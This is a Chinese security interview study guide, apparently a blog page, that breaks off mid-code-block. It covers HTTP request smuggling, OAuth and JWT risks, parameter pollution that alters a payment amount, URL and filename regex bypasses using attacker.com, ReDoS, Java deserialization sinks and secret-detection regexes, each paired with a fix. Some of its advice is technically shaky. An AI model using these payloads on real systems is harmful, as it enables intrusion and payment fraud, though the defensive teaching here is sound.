<h2 id="利用方式：-CL-TE-攻击：-修复方案：-统一-Content-Length-和-Transfer-Encoding-的解析逻辑。-在-Web-服务器和代理服务器中禁用-Transfer-Encoding-chunked。-使用最新版本的-Web-服务器，如-Nginx、Apache，修复已知漏洞。"><a href="#利用方式：-CL-TE-攻击：-修复方案：-统一-Content-Length-和-Transfer-Encoding-的解析逻辑。-在-Web-服务器和代理服务器中禁用-Transfer-Encoding-chunked。-使用最新版本的-Web-服务器，如-Nginx、Apache，修复已知漏洞。" class="headerlink" title="利用方式：- CL.TE 攻击：  修复方案：- 统一 Content-Length 和 Transfer-Encoding 的解析逻辑。- 在 Web 服务器和代理服务器中禁用 Transfer-Encoding: chunked。- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。"></a><strong>利用方式</strong>：<br>- <strong>CL.TE 攻击</strong>：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- 统一 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 的解析逻辑。<br>- 在 Web 服务器和代理服务器中禁用 <code>Transfer-Encoding: chunked</code>。<br>- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。</h2><h3 id="DNSSEC-能解决什么场景问题？"><a href="#DNSSEC-能解决什么场景问题？" class="headerlink" title="DNSSEC 能解决什么场景问题？"></a><strong>DNSSEC 能解决什么场景问题？</strong></h3><p><strong>作用</strong>：<br>DNSSEC（DNS Security Extensions）用于提供 DNS 解析数据的完整性和真实性，防止 DNS 劫持、缓存污染等攻击。</p>
<p><strong>适用场景</strong>：</p>
<ul>
<li>防止 <strong>DNS 伪造</strong>：利用数字签名验证 DNS 记录的真实性。</li>
<li><strong>防缓存投毒</strong>：确保解析器获取的是正确的 DNS 记录，而不是攻击者篡改的数据。</li>
</ul>
<h2 id="限制：-DNSSEC-不能加密-DNS-查询内容，仍然容易被监控。-部署复杂，且需要上级-DNS-服务器支持。"><a href="#限制：-DNSSEC-不能加密-DNS-查询内容，仍然容易被监控。-部署复杂，且需要上级-DNS-服务器支持。" class="headerlink" title="限制：- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。- 部署复杂，且需要上级 DNS 服务器支持。"></a><strong>限制</strong>：<br>- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。<br>- 部署复杂，且需要上级 DNS 服务器支持。</h2><h3 id="DNS-记录（DS、PTR、TXT）类型的常见作用？"><a href="#DNS-记录（DS、PTR、TXT）类型的常见作用？" class="headerlink" title="DNS 记录（DS、PTR、TXT）类型的常见作用？"></a><strong>DNS 记录（DS、PTR、TXT）类型的常见作用？</strong></h3><ul>
<li><strong>DS（Delegation Signer）</strong>：DNSSEC 相关记录，存储子域的公钥信息。</li>
<li><strong>PTR（Pointer Record）</strong>：用于反向 DNS 解析，将 IP 地址映射回域名，常用于邮件服务器验证。</li>
<li><strong>TXT（Text Record）</strong>：存储任意文本数据，常用于 SPF 记录、防垃圾邮件等。</li>
</ul>
<h2 id="示例：-SPF-记录（TXT）：-作用：指定允许的邮件发送服务器，防止伪造邮件。"><a href="#示例：-SPF-记录（TXT）：-作用：指定允许的邮件发送服务器，防止伪造邮件。" class="headerlink" title="示例：- SPF 记录（TXT）：    作用：指定允许的邮件发送服务器，防止伪造邮件。"></a><strong>示例</strong>：<br>- <strong>SPF 记录（TXT）</strong>：<br>  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com TXT &quot;v=spf1 ip4:192.168.1.1 -all&quot;</span><br></pre></td></tr></table></figure><br>  作用：指定允许的邮件发送服务器，防止伪造邮件。</h2><h3 id="将暂时不用的域名解析到-1-1-1-1-有什么好处和坏处？"><a href="#将暂时不用的域名解析到-1-1-1-1-有什么好处和坏处？" class="headerlink" title="将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？"></a><strong>将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？</strong></h3><p><strong>好处</strong>：</p>
<ul>
<li>避免原 IP 解析，防止解析记录暴露，减少攻击风险。</li>
<li>加快全球解析同步速度。</li>
</ul>
<p><strong>坏处</strong>：</p>
<ul>
<li>1.1.1.1 是 Cloudflare CDN 的 IP，可能导致误封或安全风险。</li>
<li>可能影响未来恢复使用，导致解析问题。</li>
</ul>
<h2 id="更安全的做法：-直接删除域名解析记录，或设置-NXDOMAIN-响应。"><a href="#更安全的做法：-直接删除域名解析记录，或设置-NXDOMAIN-响应。" class="headerlink" title="更安全的做法：- 直接删除域名解析记录，或设置 NXDOMAIN 响应。"></a><strong>更安全的做法</strong>：<br>- 直接删除域名解析记录，或设置 <code>NXDOMAIN</code> 响应。</h2><h3 id="OAuth-除了-redirect-uri-绕过问题外，还有哪些风险以及如何修复？"><a href="#OAuth-除了-redirect-uri-绕过问题外，还有哪些风险以及如何修复？" class="headerlink" title="OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？"></a><strong>OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？</strong></h3><p><strong>常见风险</strong>：</p>
<ul>
<li><strong>State 参数缺失</strong>：导致 CSRF 攻击，攻击者可劫持用户授权。</li>
<li><strong>Client Secret 泄露</strong>：攻击者伪造请求，冒充合法客户端获取访问权限。</li>
<li><strong>错误的 token 存储</strong>：访问令牌被存储在客户端，容易被盗用。</li>
</ul>
<h2 id="修复方案：-强制校验-state-参数，防止-CSRF：-严格验证-redirect-uri-，避免重定向到攻击者站点：-使用短生命周期-Token，避免长期暴露：-Access-Token-仅可使用一次-使用-Refresh-Token-进行长时间会话维护-全程使用-HTTPS，防止-Token-被窃听"><a href="#修复方案：-强制校验-state-参数，防止-CSRF：-严格验证-redirect-uri-，避免重定向到攻击者站点：-使用短生命周期-Token，避免长期暴露：-Access-Token-仅可使用一次-使用-Refresh-Token-进行长时间会话维护-全程使用-HTTPS，防止-Token-被窃听" class="headerlink" title="修复方案：- 强制校验 state 参数，防止 CSRF：  - **严格验证 redirect_uri**，避免重定向到攻击者站点：  - 使用短生命周期 Token，避免长期暴露：  - Access Token 仅可使用一次  - 使用 Refresh Token 进行长时间会话维护  - 全程使用 HTTPS，防止 Token 被窃听"></a><strong>修复方案</strong>：<br>- <strong>强制校验 <code>state</code> 参数</strong>，防止 CSRF：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state = generate_secure_token()</span><br><span class="line">session[<span class="string">&quot;oauth_state&quot;</span>] = state</span><br><span class="line">redirect_uri = <span class="string">f&quot;https://auth.com/oauth?state=<span class="subst">&#123;state&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><br>- **严格验证 <code>redirect_uri</code>**，避免重定向到攻击者站点：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> redirect_uri.startswith(<span class="string">&quot;https://trusted-site.com&quot;</span>):</span><br><span class="line">    abort(<span class="number">403</span>)</span><br></pre></td></tr></table></figure><br>- <strong>使用短生命周期 Token，避免长期暴露</strong>：<br>  - Access Token 仅可使用一次<br>  - 使用 Refresh Token 进行长时间会话维护<br>  - 全程使用 HTTPS，防止 Token 被窃听</h2><h3 id="JWT-相较于-SESSION-的优势？"><a href="#JWT-相较于-SESSION-的优势？" class="headerlink" title="JWT 相较于 SESSION 的优势？"></a><strong>JWT 相较于 SESSION 的优势？</strong></h3><p><strong>JWT 优势</strong>：</p>
<ul>
<li><strong>无状态</strong>：JWT 不依赖服务器存储会话数据，适用于分布式系统。</li>
<li><strong>性能优化</strong>：SESSION 需要存储在服务器，而 JWT 通过客户端传输，减少了服务器负担。</li>
<li><strong>可扩展性</strong>：JWT 可携带自定义声明（claims），支持多种身份验证场景。</li>
</ul>
<h2 id="安全注意点：-JWT-一旦泄露，攻击者可以长期使用，建议使用短生命周期-Token。-需使用-RS256（非对称加密）-或-HS256（对称加密），避免-none-算法漏洞。"><a href="#安全注意点：-JWT-一旦泄露，攻击者可以长期使用，建议使用短生命周期-Token。-需使用-RS256（非对称加密）-或-HS256（对称加密），避免-none-算法漏洞。" class="headerlink" title="安全注意点：- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。- 需使用 RS256（非对称加密） 或 HS256（对称加密），避免 none 算法漏洞。"></a><strong>安全注意点</strong>：<br>- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。<br>- 需使用 <strong>RS256（非对称加密）</strong> 或 <strong>HS256（对称加密）</strong>，避免 <code>none</code> 算法漏洞。</h2><h3 id="如何通过-HTTP-参数污染将-uid-9527-amount-100-中的-uid-改为-10086？"><a href="#如何通过-HTTP-参数污染将-uid-9527-amount-100-中的-uid-改为-10086？" class="headerlink" title="如何通过 HTTP 参数污染将 uid=9527&amp;amount=100 中的 uid 改为 10086？"></a><strong>如何通过 HTTP 参数污染将 <code>uid=9527&amp;amount=100</code> 中的 uid 改为 10086？</strong></h3><p><strong>漏洞原理</strong>：<br>HTTP 参数污染（HPP）是指通过重复提交相同参数，导致服务器在解析时出现不一致，从而实现攻击。</p>
<p><strong>利用方式</strong>：</p>
<ul>
<li><p><strong>服务器处理参数方式不同</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527&amp;uid=10086&amp;amount=100</span><br></pre></td></tr></table></figure>
<ul>
<li>某些服务器取<strong>第一个参数</strong>（<code>uid=9527</code>）</li>
<li>某些服务器取<strong>最后一个参数</strong>（<code>uid=10086</code>）</li>
</ul>
</li>
<li><p><strong>编码绕过</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527%26uid%3D10086&amp;amount=100</span><br></pre></td></tr></table></figure>
<ul>
<li><code>%26</code> 是 <code>&amp;</code> 的 URL 编码，导致 <code>uid=9527&amp;uid=10086</code> 被解析。</li>
</ul>
</li>
</ul>
<h2 id="修复方案：-严格限制参数格式，拒绝重复参数。-统一服务器端参数解析方式，确保参数唯一性。"><a href="#修复方案：-严格限制参数格式，拒绝重复参数。-统一服务器端参数解析方式，确保参数唯一性。" class="headerlink" title="修复方案：- 严格限制参数格式，拒绝重复参数。- 统一服务器端参数解析方式，确保参数唯一性。"></a><strong>修复方案</strong>：<br>- 严格限制参数格式，拒绝重复参数。<br>- 统一服务器端参数解析方式，确保参数唯一性。</h2><h3 id="当网关对所有请求会进行一次强制-urldecode，存在一个参数-uid-9527-remark-充话费-amount-100-的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？"><a href="#当网关对所有请求会进行一次强制-urldecode，存在一个参数-uid-9527-remark-充话费-amount-100-的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？" class="headerlink" title="当网关对所有请求会进行一次强制 urldecode，存在一个参数 uid=9527&amp;remark=充话费&amp;amount=100 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？"></a><strong>当网关对所有请求会进行一次强制 urldecode，存在一个参数 <code>uid=9527&amp;remark=充话费&amp;amount=100</code> 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？</strong></h3><p><strong>漏洞原理</strong>：<br>如果网关会强制 <code>urldecode</code>，攻击者可以利用 <code>%26</code>（即 <code>&amp;</code>）或 <code>%3D</code>（即 <code>=</code>）进行解析绕过，篡改 <code>amount</code>。</p>
<p><strong>利用方式</strong>：<br>GET &#x2F;pay?uid&#x3D;9527&amp;remark&#x3D;充话费%26amount%3D100000<br>如果服务器在 <code>urldecode</code> 后处理：<br>uid&#x3D;9527&amp;remark&#x3D;充话费&amp;amount&#x3D;100000<br>此时 <code>amount</code> 被成功修改为 100000。</p>
<h2 id="修复方案：-对输入数据进行二次编码检查，避免-urldecode-解析参数。-使用-JSON-传输数据，避免-query-string-参数解析问题。"><a href="#修复方案：-对输入数据进行二次编码检查，避免-urldecode-解析参数。-使用-JSON-传输数据，避免-query-string-参数解析问题。" class="headerlink" title="修复方案：- 对输入数据进行二次编码检查，避免 urldecode 解析参数。- 使用 JSON 传输数据，避免 query string 参数解析问题。"></a><strong>修复方案</strong>：<br>- <strong>对输入数据进行二次编码检查</strong>，避免 <code>urldecode</code> 解析参数。<br>- <strong>使用 JSON 传输数据</strong>，避免 <code>query string</code> 参数解析问题。</h2><h3 id="哪些漏洞的测试对业务有损？如何避免？"><a href="#哪些漏洞的测试对业务有损？如何避免？" class="headerlink" title="哪些漏洞的测试对业务有损？如何避免？"></a><strong>哪些漏洞的测试对业务有损？如何避免？</strong></h3><p><strong>高风险测试</strong>：</p>
<ul>
<li><strong>SQL 注入</strong>：可能导致数据库崩溃。</li>
<li><strong>CSRF 测试</strong>：可能导致用户误操作。</li>
<li><strong>逻辑漏洞</strong>：批量刷单、支付绕过等测试可能影响业务数据。</li>
</ul>
<h2 id="避免方案：-在-测试环境-进行验证，避免直接在生产环境测试。-对关键-API-限制高频请求，防止影响用户体验。"><a href="#避免方案：-在-测试环境-进行验证，避免直接在生产环境测试。-对关键-API-限制高频请求，防止影响用户体验。" class="headerlink" title="避免方案：- 在 测试环境 进行验证，避免直接在生产环境测试。- 对关键 API 限制高频请求，防止影响用户体验。"></a><strong>避免方案</strong>：<br>- 在 <strong>测试环境</strong> 进行验证，避免直接在生产环境测试。<br>- 对关键 API 限制高频请求，防止影响用户体验。</h2><h3 id="漏洞修复一般分为哪几个步骤？"><a href="#漏洞修复一般分为哪几个步骤？" class="headerlink" title="漏洞修复一般分为哪几个步骤？"></a><strong>漏洞修复一般分为哪几个步骤？</strong></h3><ol>
<li><strong>漏洞确认</strong>：分析漏洞是否真实存在。</li>
<li><strong>风险评估</strong>：确定漏洞的影响范围和紧急程度。</li>
<li><strong>修复方案</strong>：制定修复方案，可能包括代码修复、配置调整等。</li>
<li><strong>修复验证</strong>：测试修复是否生效，确保无新问题引入。</li>
</ol>
<hr>
<h3 id="如何制定漏洞的修复时间？需要考虑哪些因素？"><a href="#如何制定漏洞的修复时间？需要考虑哪些因素？" class="headerlink" title="如何制定漏洞的修复时间？需要考虑哪些因素？"></a><strong>如何制定漏洞的修复时间？需要考虑哪些因素？</strong></h3><p><strong>关键考虑因素</strong>：</p>
<ul>
<li><strong>漏洞严重度</strong>（高危漏洞需立即修复）。</li>
<li><strong>业务影响</strong>（避免修复影响核心业务）。</li>
<li><strong>修复成本</strong>（代码改动、测试资源）。</li>
</ul>
<h2 id="最佳实践：-P0（高危）：24-小时内修复。-P1（中危）：1-周内修复。-P2（低危）：1-个月内修复。"><a href="#最佳实践：-P0（高危）：24-小时内修复。-P1（中危）：1-周内修复。-P2（低危）：1-个月内修复。" class="headerlink" title="最佳实践：- P0（高危）：24 小时内修复。- P1（中危）：1 周内修复。- P2（低危）：1 个月内修复。"></a><strong>最佳实践</strong>：<br>- <strong>P0（高危）</strong>：24 小时内修复。<br>- <strong>P1（中危）</strong>：1 周内修复。<br>- <strong>P2（低危）</strong>：1 个月内修复。</h2><h3 id="如何有效提升漏洞修复效率？"><a href="#如何有效提升漏洞修复效率？" class="headerlink" title="如何有效提升漏洞修复效率？"></a><strong>如何有效提升漏洞修复效率？</strong></h3><h2 id="优化方法：-漏洞分类，制定标准化修复流程。-自动化测试，减少回归测试成本。-开发安全培训，提高修复能力。"><a href="#优化方法：-漏洞分类，制定标准化修复流程。-自动化测试，减少回归测试成本。-开发安全培训，提高修复能力。" class="headerlink" title="优化方法：- 漏洞分类，制定标准化修复流程。- 自动化测试，减少回归测试成本。- 开发安全培训，提高修复能力。"></a><strong>优化方法</strong>：<br>- <strong>漏洞分类</strong>，制定标准化修复流程。<br>- <strong>自动化测试</strong>，减少回归测试成本。<br>- <strong>开发安全培训</strong>，提高修复能力。</h2><h3 id="什么类型漏洞是代码审计无法准确判断存在与否的？"><a href="#什么类型漏洞是代码审计无法准确判断存在与否的？" class="headerlink" title="什么类型漏洞是代码审计无法准确判断存在与否的？"></a><strong>什么类型漏洞是代码审计无法准确判断存在与否的？</strong></h3><p><strong>常见难以判断的漏洞</strong>：</p>
<ul>
<li><strong>业务逻辑漏洞</strong>：如支付接口绕过、积分漏洞，依赖具体业务逻辑。</li>
<li><strong>权限控制问题</strong>：仅看代码难以判断 API 是否可被未授权用户访问。</li>
<li><strong>时间相关漏洞</strong>：如竞态条件（Race Condition），代码静态分析难以检测。</li>
<li><strong>加密安全性</strong>：仅从代码无法判断加密算法的强度，需结合实际使用环境分析。</li>
</ul>
<h2 id="解决方案：-结合动态分析（DAST）-人工测试，验证漏洞是否可被利用。"><a href="#解决方案：-结合动态分析（DAST）-人工测试，验证漏洞是否可被利用。" class="headerlink" title="解决方案：- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。"></a><strong>解决方案</strong>：<br>- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。</h2><h3 id="密钥的识别的正则如何写？"><a href="#密钥的识别的正则如何写？" class="headerlink" title="密钥的识别的正则如何写？"></a><strong>密钥的识别的正则如何写？</strong></h3><h2 id="匹配-API-Key、JWT、OAuth-Token：-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-匹配-AWS-访问密钥：AKIA-0-9A-Z-16-匹配私钥：-BEGIN-RSA-DSA-EC-PRIVATE-KEY-修复方案：-禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。"><a href="#匹配-API-Key、JWT、OAuth-Token：-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-匹配-AWS-访问密钥：AKIA-0-9A-Z-16-匹配私钥：-BEGIN-RSA-DSA-EC-PRIVATE-KEY-修复方案：-禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。" class="headerlink" title="匹配 API Key、JWT、OAuth Token：(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]{20,60})[&quot;&#39;]?匹配 AWS 访问密钥：AKIA[0-9A-Z]{16}匹配私钥：-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----修复方案：- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。"></a><strong>匹配 API Key、JWT、OAuth Token</strong>：<br><code>(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]&#123;20,60&#125;)[&quot;&#39;]?</code><br><strong>匹配 AWS 访问密钥</strong>：<br><code>AKIA[0-9A-Z]&#123;16&#125;</code><br><strong>匹配私钥</strong>：<br><code>-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----</code><br><strong>修复方案</strong>：<br>- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。</h2><h3 id="正则-a-会存在哪些风险？"><a href="#正则-a-会存在哪些风险？" class="headerlink" title="正则 (a+)+ 会存在哪些风险？"></a><strong>正则 <code>(a+)+</code> 会存在哪些风险？</strong></h3><p><strong>风险点</strong>：</p>
<ul>
<li><strong>正则回溯爆炸（ReDoS）</strong>：当输入较长的 <code>a</code> 时，正则引擎可能会产生指数级回溯，导致 CPU 计算量激增，可能被 DoS 攻击利用。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import re; re.match(&quot;(a+)+&quot;, &quot;a&quot; * 100000)&#x27;</span></span><br></pre></td></tr></table></figure>
可能导致 CPU 挂死。</li>
</ul>
<h2 id="修复方案：-避免使用嵌套重复匹配-a-，改用-a-限制匹配范围。-使用非回溯正则（如-RE2-引擎）。"><a href="#修复方案：-避免使用嵌套重复匹配-a-，改用-a-限制匹配范围。-使用非回溯正则（如-RE2-引擎）。" class="headerlink" title="修复方案：- 避免使用嵌套重复匹配 (a+)+，改用 ^a+$ 限制匹配范围。- 使用非回溯正则（如 RE2 引擎）。"></a><strong>修复方案</strong>：<br>- 避免使用嵌套重复匹配 <code>(a+)+</code>，改用 <code>^a+$</code> 限制匹配范围。<br>- 使用<strong>非回溯正则</strong>（如 RE2 引擎）。</h2><h3 id="程序对读取的文件名的正则为-markdown-，如何绕过？"><a href="#程序对读取的文件名的正则为-markdown-，如何绕过？" class="headerlink" title="程序对读取的文件名的正则为 /\.markdown/，如何绕过？"></a><strong>程序对读取的文件名的正则为 <code>/\.markdown/</code>，如何绕过？</strong></h3><p><strong>绕过方式</strong>：</p>
<ul>
<li><strong>大小写绕过</strong>：<code>readme.Markdown</code></li>
<li><strong>编码绕过</strong>：<code>readme.%6Darkdown</code></li>
<li><strong>目录穿越</strong>：<code>./readme.markdown./</code></li>
<li><strong>Unicode 绕过</strong>：<code>readme.mar𝗸down</code>（利用 Unicode 变体）</li>
<li><strong>双写绕过</strong>：<code>readme..markdown</code></li>
</ul>
<h2 id="修复方案：-严格使用-basename-解析路径："><a href="#修复方案：-严格使用-basename-解析路径：" class="headerlink" title="修复方案：- 严格使用 basename 解析路径：  "></a><strong>修复方案</strong>：<br>- <strong>严格使用 <code>basename</code> 解析路径</strong>：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">filename = os.path.basename(user_input)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&quot;.markdown&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid file type&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="程序对请求的-URL-的正则为-http-feei-cn-，如何绕过？"><a href="#程序对请求的-URL-的正则为-http-feei-cn-，如何绕过？" class="headerlink" title="程序对请求的 URL 的正则为 /^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/，如何绕过？"></a><strong>程序对请求的 URL 的正则为 <code>/^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/</code>，如何绕过？</strong></h3><p><strong>绕过方式</strong>：</p>
<ul>
<li><strong>编码绕过</strong>：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.fe%65i.cn</span><br></pre></td></tr></table></figure></li>
<li><strong>使用 <code>@</code> 符号</strong>（URL 解析差异）：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.com@feei.cn</span><br></pre></td></tr></table></figure></li>
<li><strong>双写 <code>//</code> 规避解析</strong>：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://feei.cn//@attacker.com</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="修复方案：-严格解析域名，不依赖正则："><a href="#修复方案：-严格解析域名，不依赖正则：" class="headerlink" title="修复方案：- 严格解析域名，不依赖正则：  "></a><strong>修复方案</strong>：<br>- <strong>严格解析域名</strong>，不依赖正则：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_url</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parsed.netloc.endswith(<span class="string">&quot;.feei.cn&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid domain&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="解释型语言和编译型语言在语法树分析上有什么差异？"><a href="#解释型语言和编译型语言在语法树分析上有什么差异？" class="headerlink" title="解释型语言和编译型语言在语法树分析上有什么差异？"></a><strong>解释型语言和编译型语言在语法树分析上有什么差异？</strong></h3><p><strong>解释型语言（如 Python、JavaScript）</strong>：</p>
<ul>
<li><strong>动态类型</strong>：变量类型可变，增加了静态分析的难度。</li>
<li><strong>运行时特性</strong>：如 <code>eval()</code>、<code>exec()</code> 使得代码行为无法完全静态分析。</li>
<li><strong>AST 解析依赖上下文</strong>：如 <code>import</code> 语句的动态导入。</li>
</ul>
<h2 id="编译型语言（如-C、Java）：-类型确定：变量类型在编译期已确定，静态分析更稳定。-优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。"><a href="#编译型语言（如-C、Java）：-类型确定：变量类型在编译期已确定，静态分析更稳定。-优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。" class="headerlink" title="编译型语言（如 C、Java）：- 类型确定：变量类型在编译期已确定，静态分析更稳定。- 优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。"></a><strong>编译型语言（如 C、Java）</strong>：<br>- <strong>类型确定</strong>：变量类型在编译期已确定，静态分析更稳定。<br>- <strong>优化可能影响漏洞分析</strong>：编译器优化可能导致某些漏洞难以被静态分析发现。</h2><h3 id="Java-Web-应用中的反序列化漏洞的-Source-和-Sink-是什么？"><a href="#Java-Web-应用中的反序列化漏洞的-Source-和-Sink-是什么？" class="headerlink" title="Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？"></a><strong>Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？</strong></h3><p><strong>Source（数据入口）</strong>：</p>
<ul>
<li><strong>用户可控输入</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br></pre></td></tr></table></figure></li>
<li><strong>远程方法调用（RMI）</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;attacker.com&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure></li>
<li><strong>文件读取</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(userInput);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>Sink（危险执行点）</strong>：</p>
<ul>
<li><strong><code>readObject()</code> 触发反序列化</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li>
<li><strong>EL 解析</strong>（Struts2）：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();</span><br></pre></td></tr></table></figure></li>
<li><strong>XStream 反序列化</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> xstream.fromXML(xml);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="修复方案：-禁用不安全的-readObject-：-仅允许反序列化可信类型："><a href="#修复方案：-禁用不安全的-readObject-：-仅允许反序列化可信类型：" class="headerlink" title="修复方案：- 禁用不安全的 readObject()：  - 仅允许反序列化可信类型：  "></a><strong>修复方案</strong>：<br>- 禁用不安全的 <code>readObject()</code>：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Deserialization not allowed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>- 仅允许反序列化可信类型：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 